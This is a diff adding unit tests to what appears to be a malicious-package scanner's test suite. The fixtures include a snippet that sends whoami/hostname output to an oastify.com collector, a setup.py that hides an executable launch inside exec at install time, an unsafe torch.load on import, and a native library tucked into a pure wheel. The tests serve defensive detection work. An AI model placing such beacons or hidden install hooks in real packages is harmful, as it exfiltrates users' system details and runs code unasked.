@@ -13859,3 +13859,97 @@ class TestTheLoadPathSkipsTheScriptBlock:
             if "BEACON" in f.rule_id
         ]
         assert all(f.severity <= Severity.MEDIUM for f in found)
+
+
+class TestPayloadsTheDatasetShowedWereMissed:
+    @staticmethod
+    def _rules(tmp_path, files: dict[str, bytes | str]) -> dict[str, str]:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        for name, body in files.items():
+            target = tmp_path / name
+            target.parent.mkdir(parents=True, exist_ok=True)
+            if isinstance(body, bytes):
+                target.write_bytes(body)
+            else:
+                target.write_text(body, encoding="utf-8")
+        return {
+            f.rule_id: f.severity.name
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+        }
+
+    def test_identity_commands_sent_to_a_collector(self, tmp_path) -> None:
+        source = (
+            "import json, subprocess, urllib.request\n"
+            "URL = 'https://x1.oast"
+            "ify.com/e'\n"
+            "data = {'who': subprocess.getoutput('whoami'), 'host': subprocess.getoutput('hostname')}\n"
+            "urllib.request.urlopen(urllib.request.Request(URL, data=json.dumps(data).encode()))\n"
+        )
+        assert (
+            self._rules(tmp_path, {"pkg/__init__.py": source}).get("SUSPECT.EXFIL.BEACON.001")
+            == "HIGH"
+        )
+
+    def test_a_spawn_hidden_in_an_executed_string_at_install(self, tmp_path) -> None:
+        source = (
+            "import subprocess as s, os, sys\nfrom setuptools import setup\n"
+            "exec(\"s.run(os.path.abspath('s.exe'), check=1)\" if sys.platform == 'win32' else 'pass')\n"
+            "setup(name='p')\n"
+        )
+        assert (
+            self._rules(tmp_path, {"setup.py": source}).get("MALWARE.INSTALL.HIDDEN_ACTION.001")
+            == "CRITICAL"
+        )
+
+    def test_the_same_call_written_out_is_not_hidden(self, tmp_path) -> None:
+        source = "import subprocess, sys\nfrom setuptools import setup\nsubprocess.run(['make'])\nsetup(name='p')\n"
+        assert "MALWARE.INSTALL.HIDDEN_ACTION.001" not in self._rules(
+            tmp_path, {"setup.py": source}
+        )
+
+    def test_an_unsafe_load_of_a_bundled_model_on_import(self, tmp_path) -> None:
+        source = (
+            "import os, torch\n"
+            "model = torch.load(os.path.join(os.path.dirname(__file__), 'model.pt'), weights_only=False)\n"
+        )
+        assert (
+            self._rules(tmp_path, {"pkg/init_model.py": source}).get(
+                "SUSPECT.MODEL.LOADED_ON_IMPORT.001"
+            )
+            == "HIGH"
+        )
+
+    def test_a_safe_load_or_a_users_file_is_not(self, tmp_path) -> None:
+        source = (
+            "import os, torch\n"
+            "model = torch.load(os.path.join(os.path.dirname(__file__), 'model.pt'))\n"
+            "def load(path):\n    return torch.load(path, weights_only=False)\n"
+        )
+        assert "SUSPECT.MODEL.LOADED_ON_IMPORT.001" not in self._rules(
+            tmp_path, {"pkg/m.py": source}
+        )
+
+    def test_a_pure_wheel_loading_its_own_native_library(self, tmp_path) -> None:
+        files = {
+            "colorlib-1.0.dist-info/WHEEL": "Wheel-Version: 1.0\nRoot-Is-Purelib: true\nTag: py3-none-any\n",
+            "colorlib/terminate.so": b"\x7fELF" + bytes(60),
+            "colorlib/unicode.py": "import ctypes, os\nlib = ctypes.CDLL(os.path.dirname(__file__) + '/terminate.so')\n",
+        }
+        assert self._rules(tmp_path, files).get("SUSPECT.BINARY.NATIVE_IN_PURE_WHEEL.001") == "HIGH"
+
+    def test_a_platform_wheel_doing_the_same_is_not(self, tmp_path) -> None:
+        files = {
+            "fastlib-1.0.dist-info/WHEEL": "Wheel-Version: 1.0\nRoot-Is-Purelib: false\nTag: cp312-cp312-manylinux_2_17_x86_64\n",
+            "fastlib/libfast.so": b"\x7fELF" + bytes(60),
+            "fastlib/__init__.py": "import ctypes, os\nlib = ctypes.CDLL(os.path.dirname(__file__) + '/libfast.so')\n",
+        }
+        assert "SUSPECT.BINARY.NATIVE_IN_PURE_WHEEL.001" not in self._rules(tmp_path, files)
+
+    def test_obfuscator_io_in_a_dist_bundle_is_not_build_output(self, tmp_path) -> None:
+        names = "".join(f"var _0x{n:04x}=_0x{n + 1:04x};" for n in range(0x1A00, 0x1A20))
+        files = {"package/dist/worker.js": "(()=>{var a=1;})();\n" + names + "\n"}
+        assert self._rules(tmp_path, files).get("SUSPECT.OBFUSCATION.PACKED.001") == "HIGH"
